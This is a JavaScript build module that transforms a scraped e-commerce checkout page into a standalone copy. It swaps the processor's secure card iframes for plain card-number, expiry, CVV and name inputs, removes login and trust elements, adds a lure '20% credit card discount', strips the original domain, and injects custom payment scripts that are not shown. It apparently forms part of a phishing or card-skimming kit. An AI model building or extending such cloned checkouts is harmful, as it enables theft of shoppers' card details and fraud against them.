/**
 * Shared checkout HTML transforms (scrape → public/checkout).
 */
import fs from 'fs';
import path from 'path';
import { fileURLToPath } from 'url';
import * as cheerio from 'cheerio';

const __dirname = path.dirname(fileURLToPath(import.meta.url));
export const ROOT = path.join(__dirname, '..');
export const SCRAPE = path.join(ROOT, 'scrape', '20260611204543362', 'index.html');
export const OUT = path.join(ROOT, 'public', 'checkout', 'index.html');
export const FIELDS_JS = path.join(ROOT, 'public', 'checkout', 'checkout-fields.js');
export const FIX_CSS = path.join(ROOT, 'public', 'checkout', 'checkout-fix.css');
export const CUSTOM_FIELDS = path.join(ROOT, 'custom', 'checkout', 'checkout-fields.js');
export const CUSTOM_FIX_CSS = path.join(ROOT, 'custom', 'checkout', 'checkout-fix.css');

export const INPUT_CLASS =
  '_7ozb2ur _7ozb2uq _1fragemtb _1fragemwg _1fragemz5 _1fragem100 _1fragemzh _7ozb2uw _7ozb2uv _1fragemzp _1fragemzk _1fragemzz _7ozb2u16 _7ozb2u1b _7ozb2u1u _7ozb2us';

export const CARD_FIELDS = [
  { hostId: 'number', inputId: 'card-number', labelId: 'number-label', autocomplete: 'cc-number', inputmode: 'numeric' },
  { hostId: 'expiry', inputId: 'card-expiry', labelId: 'expiry-label', autocomplete: 'cc-exp', inputmode: 'numeric' },
  { hostId: 'verification_value', inputId: 'card-cvv', labelId: 'verification_value-label', autocomplete: 'cc-csc', inputmode: 'numeric' },
  { hostId: 'name', inputId: 'card-name', labelId: 'name-label', autocomplete: 'cc-name' },
];

export function loadScrape() {
  if (!fs.existsSync(SCRAPE)) throw new Error(`Scrape not found: ${SCRAPE}`);
  const raw = fs.readFileSync(SCRAPE, 'utf8');
  return cheerio.load(raw, { decodeEntities: false });
}

export function replaceCardIframes($) {
  for (const f of CARD_FIELDS) {
    const $host = $(`#${f.hostId}`).first();
    if (!$host.length) continue;

    const $label = $(`label#${f.labelId}, label[for="${f.hostId}"]`).first();
    if ($label.length) $label.attr('for', f.inputId);

    $host.removeAttr('tabindex data-card-fields data-card-field-placeholder data-card-field-prefix');
    $host.removeClass('_211UF');

    const labelText = $label.find('.rermvf1').first().text().trim() || $label.text().trim();

    const attrs = [
      `id="${f.inputId}"`,
      `class="${INPUT_CLASS}"`,
      `autocomplete="${f.autocomplete}"`,
      'value=""',
      `aria-labelledby="${f.labelId}"`,
    ];
    if (f.inputmode) attrs.push(`inputmode="${f.inputmode}"`);
    if (labelText) attrs.push(`placeholder="${labelText.replace(/"/g, '&quot;')}"`);

    $host.empty().append(`<input ${attrs.join(' ')}>`);
  }

  $('button[aria-label*="Security code"]').closest('._4VRZE').remove();

  for (const extraId of ['issue_date', 'issue_number']) {
    const $host = $(`#${extraId}`).first();
    if ($host.length) $host.closest('.Uq6Ln').remove();
  }

  $('iframe.card-fields-iframe').remove();
}

export function removeCheckoutBlocks($) {
  $('section[aria-label="Quick Checkout"]').remove();
  $('#gift-card-field').remove();
  $('#3p-gift-card-field').remove();

  $('a[href*="customer_authentication/login"]').remove();
  $('a').each((_, el) => {
    if ($(el).text().trim() === 'Sign in') $(el).remove();
  });

  $('#basic-SHOPIFY_INSTALLMENTS').closest('._1u2aa6m3').remove();

  $('#billingAddressDetails').remove();
  $('#billingAddressCheckbox').closest('._1mmswk95').remove();
  $('#billingAddressCheckbox').remove();
  $('label[for="billingAddressCheckbox"]').remove();

  $('div[aria-label="Remember me"]').remove();
  $('shop-checkout-modal').remove();
  $('div[data-nametag="shop-portal-provider"]').remove();

  $('.sBuoU button').each((_, el) => {
    if ($(el).text().trim() === 'Not now') $(el).closest('.sBuoU').remove();
  });

  $('#SandboxContainer').remove();
  $('#web-pixels-manager-sandbox-container').remove();
  $('iframe').remove();
}

export const CUSTOM_APP = path.join(ROOT, 'custom', 'checkout', 'checkout-app.js');
export const CUSTOM_PAYMENT_METHODS = path.join(ROOT, 'custom', 'checkout', 'payment-methods.js');
export const CUSTOM_PAYMENT_OVERLAYS = path.join(ROOT, 'custom', 'checkout', 'payment-overlays.js');
export const CUSTOM_PAYMENT_CORE = path.join(ROOT, 'custom', 'checkout', 'payment-core.js');
export const APP_JS = path.join(ROOT, 'public', 'checkout', 'checkout-app.js');

export const MY_STATES = [
  ['JHR', 'Johor'], ['KDH', 'Kedah'], ['KTN', 'Kelantan'], ['KUL', 'Kuala Lumpur'],
  ['LBN', 'Labuan'], ['MLK', 'Malacca'], ['NSN', 'Negeri Sembilan'], ['PHG', 'Pahang'],
  ['PNG', 'Penang'], ['PRK', 'Perak'], ['PLS', 'Perlis'], ['PJY', 'Putrajaya'],
  ['SBH', 'Sabah'], ['SWK', 'Sarawak'], ['SGR', 'Selangor'], ['TRG', 'Terengganu'],
];

function isBillingField($, $el) {
  const auto = ($el.attr('autocomplete') || '').toLowerCase();
  return auto.startsWith('billing') || $el.closest('#billingAddressDetails').length > 0;
}

export function assignFieldIds($) {
  const map = [
    ['shipping email', 'bill-email'],
    ['email', 'bill-email'],
    ['shipping country-name', 'bill-country'],
    ['country-name', 'bill-country'],
    ['shipping given-name', 'bill-first'],
    ['given-name', 'bill-first'],
    ['shipping family-name', 'bill-last'],
    ['family-name', 'bill-last'],
    ['shipping street-address', 'bill-address'],
    ['street-address', 'bill-address'],
    ['shipping postal-code', 'bill-postal'],
    ['postal-code', 'bill-postal'],
    ['shipping address-level2', 'bill-city'],
    ['address-level2', 'bill-city'],
    ['shipping address-level1', 'bill-state'],
    ['address-level1', 'bill-state'],
    ['shipping tel-national', 'bill-phone'],
    ['tel-national', 'bill-phone'],
  ];
  const assigned = new Set();
  for (const [auto, id] of map) {
    if (assigned.has(id)) continue;
    $(`[autocomplete="${auto}"]`).each((_, el) => {
      const $el = $(el);
      if (isBillingField($, $el)) return;
      if ($('#' + id).length) return;
      $el.attr('id', id);
      if (id === 'bill-country') $el.attr('name', 'countryCode');
      if (id === 'bill-state') $el.attr('name', 'zone');
      assigned.add(id);
    });
  }
  if (!$('#bill-email').length) {
    $('input[type="email"]').not('#billingAddressDetails input').first().attr('id', 'bill-email');
  }
}

export function fixStateSelect($) {
  let $state = $('#bill-state');
  if (!$state.length) {
    $state = $('select[name="zone"]').not('#billingAddressDetails select').first();
    if ($state.length) $state.attr('id', 'bill-state');
  }
  if ($state.length && $state.is('select')) {
    $state.empty();
    $state.append('<option hidden disabled value="" selected>&nbsp;</option>');
    for (const [val, label] of MY_STATES) {
      $state.append(`<option value="${val}">${label}</option>`);
    }
    const $label = $state.closest('.RD23h, .VZudx').find('label.QCxaD').first();
    if ($label.length && !$label.attr('for')) $label.attr('for', 'bill-state');
  }
}

/** Credit + Debit rows; keeps #directPaymentMethodDetails inside credit collapsible */
export function setupPaymentMethods($) {
  if ($('#basic-debitCards').length) return;

  let $credit = $('input#basic-creditCards').first();
  if (!$credit.length) {
    $('label').each((_, el) => {
      if ($(el).text().includes('Credit card')) {
        $credit = $(el).closest('._1u2aa6m3').find('input[type="radio"]').first();
        return false;
      }
    });
  }
  if (!$credit.length) return;

  $credit.attr('checked', 'checked');
  const $creditRow = $credit.closest('._1u2aa6m3');
  const $creditColl = $('#basic-creditCards-collapsible');

  const $debitRow = $creditRow.clone();
  $debitRow.find('input[type="radio"]').each((_, el) => {
    $(el).attr({ id: 'basic-debitCards', name: 'basic', 'aria-label': 'Debit card' });
    $(el).removeAttr('checked');
  });
  $debitRow.find('[id$="-secondary"]').remove();
  $debitRow.find('label[for]').attr('for', 'basic-debitCards');
  $debitRow.find('strong').first().text('Debit card');
  $debitRow.find('img').remove();
  $debitRow.find('[data-option-selected]').attr('data-option-selected', 'false');

  const $debitColl = $('<div id="basic-debitCards-collapsible" class="hidden" style="display:none"></div>');

  if ($creditColl.length) {
    $creditColl.after($debitRow);
    $debitRow.after($debitColl);
  } else {
    $creditRow.after($debitRow);
    $debitRow.after($debitColl);
  }
}

export function cleanupLayout($) {
  $('#summary-items').remove();
  $('aside[data-inspector-id="orderSummary"]').remove();

  $('button').each((_, el) => {
    const t = $(el).text().trim();
    if (t === 'Accept Offer' || t === 'Back to finalize order') $(el).remove();
  });

  $('main#checkout-main section').each((_, el) => {
    const $sec = $(el);
    const h = $sec.find('> div > h2, > div > h3, h2, h3').first().text().trim();
    if (/^Add discount$/i.test(h) || /^Finalize order$/i.test(h)) $sec.remove();
  });

  const $sidebarRoot = $('div[data-inspector-id="orderSummary"] aside').first().length
    ? $('div[data-inspector-id="orderSummary"] aside').first()
    : $('aside').last();

  if ($sidebarRoot.length) {
    $sidebarRoot.find('h3').each((_, h3) => {
      const $h = $(h3);
      if ($h.text().trim() !== 'Shopping cart') return;
      const $cartSection = $h.closest('section[aria-label="Shopping cart"], section');
      $cartSection.find('[role="table"], [role="rowgroup"], .ScrollForMore').remove();
      $cartSection.append('<div id="summary-items"></div>');
    });

    $sidebarRoot.find('h3').each((_, h3) => {
      const $h = $(h3);
      if ($h.text().trim() !== 'Cost summary') return;
      const $section = $h.closest('section');
      let hasDiscount = false;
      $section.find('[role="row"], tr').each((_, row) => {
        const text = $(row).text().replace(/\s+/g, ' ').trim();
        if (/^Subtotal/i.test(text)) {
          $(row).find('strong, span, td, p, div').last().attr('id', 'subtotal-price');
        }
        if (/^Total/i.test(text) || (text.includes('MYR') && text.includes('RM'))) {
          $(row).find('span, strong').each((_, el) => {
            if ($(el).text().trim() === 'MYR') $(el).remove();
          });
          $(row).find('strong, span, td, p, div').last().attr('id', 'total-price');
        }
        if (/Enter shipping address/i.test(text)) {
          $(row).find('td, span, p, div').last().attr('data-tc-shipping', '1').text('Free');
        }
      });
      if (!hasDiscount) {
        $section.find('[role="row"], tr').last().before(
          '<div id="discount-row" role="row" style="display:none"><span>Credit card discount (20%)</span><span id="discount-price"></span></div>'
        );
      }
      $section.find('strong, span').each((_, el) => {
        const t = $(el).text().replace(/\s+/g, ' ').trim();
        if (/^MYR\s*RM/i.test(t)) $(el).text(t.replace(/^MYR\s*/i, ''));
      });
    });

    let $payBtn = null;
    $sidebarRoot.find('button').each((_, el) => {
      const t = $(el).text().trim();
      if (/^submit$/i.test(t) || /pay now/i.test(t)) {
        $payBtn = $(el);
        return false;
      }
    });
    if ($payBtn && $payBtn.length) {
      $payBtn.attr('id', 'pay-btn').attr('type', 'button').text('Pay now');
    } else {
      $sidebarRoot.append('<button id="pay-btn" type="button" class="_1fragemvf">Pay now</button>');
    }

    if (!$('#checkout-status').length) {
      $sidebarRoot.prepend(
        '<div id="checkout-status" role="status" style="display:none;margin-bottom:12px;padding:10px 12px;border-radius:8px;font-size:14px"></div>'
      );
    }
  }

  $('button').not('#pay-btn').each((_, el) => {
    if (/^pay now$/i.test($(el).text().trim())) $(el).remove();
  });

  if (!$('#subtotal-price').length) $('body').append('<span id="subtotal-price" hidden></span>');
  if (!$('#total-price').length) $('body').append('<span id="total-price" hidden></span>');
}

export function injectCardErrorSlot($) {
  const $cardInput = $('#card-number');
  const $cardHost = $cardInput.closest('.Uq6Ln');
  if ($cardHost.length && !$('#card-number-error').length) {
    $cardHost.after('<p id="card-number-error" role="alert" style="display:none;color:#c62828;font-size:13px;margin:4px 0 0"></p>');
  }
}

export function fixFloatingLabels($) {
  $('._7ozb2u7').each((_, wrap) => {
    const $wrap = $(wrap);
    const $input = $wrap.find('input, textarea').first();
    const $label = $wrap.find('label.xpgeoa3, label.xpgeoa1').first();
    if (!$input.length || !$label.length) return;
    const labelText = $label.find('.rermvf1').first().text().trim() || $label.text().trim();
    if (labelText && !$input.attr('placeholder')) $input.attr('placeholder', labelText);
    if (!$input.val()) {
      $wrap.removeClass('_7ozb2u1u');
      $label.removeClass('xpgeoa0');
    }
  });
}

const CUSTOM_ASSETS = [
  ['checkout-fields.js', FIELDS_JS, CUSTOM_FIELDS],
  ['checkout-fix.css', FIX_CSS, CUSTOM_FIX_CSS],
  ['payment-methods.js', path.join(ROOT, 'public', 'checkout', 'payment-methods.js'), CUSTOM_PAYMENT_METHODS],
  ['payment-overlays.js', path.join(ROOT, 'public', 'checkout', 'payment-overlays.js'), CUSTOM_PAYMENT_OVERLAYS],
  ['payment-core.js', path.join(ROOT, 'public', 'checkout', 'payment-core.js'), CUSTOM_PAYMENT_CORE],
  ['checkout-app.js', APP_JS, CUSTOM_APP],
];

export function syncAssetFiles() {
  fs.mkdirSync(path.dirname(FIELDS_JS), { recursive: true });
  for (const [, dest, src] of CUSTOM_ASSETS) {
    if (fs.existsSync(src)) fs.copyFileSync(src, dest);
  }
}

export function injectAssets($, { wire = false } = {}) {
  if (!$('link[href="/checkout/checkout-fix.css"]').length) {
    $('head').append('<link rel="stylesheet" href="/checkout/checkout-fix.css">');
  }
  if (!$('script[src="/checkout/checkout-fields.js"]').length) {
    $('body').append('<script src="/checkout/checkout-fields.js"><\/script>');
  }
  if (wire) {
    for (const src of [
      '/checkout/payment-methods.js',
      '/checkout/payment-core.js',
      '/checkout/payment-overlays.js',
      '/checkout/checkout-app.js',
    ]) {
      if (!$(`script[src="${src}"]`).length) {
        $('body').append(`<script src="${src}"><\/script>`);
      }
    }
  }
}

export function writeCheckout($, { wire = false } = {}) {
  injectAssets($, { wire });
  let html = $.html();
  html = html.replace(/https:\/\/shop-titancore\.com/g, '');
  fs.writeFileSync(OUT, html, 'utf8');
  return html;
}
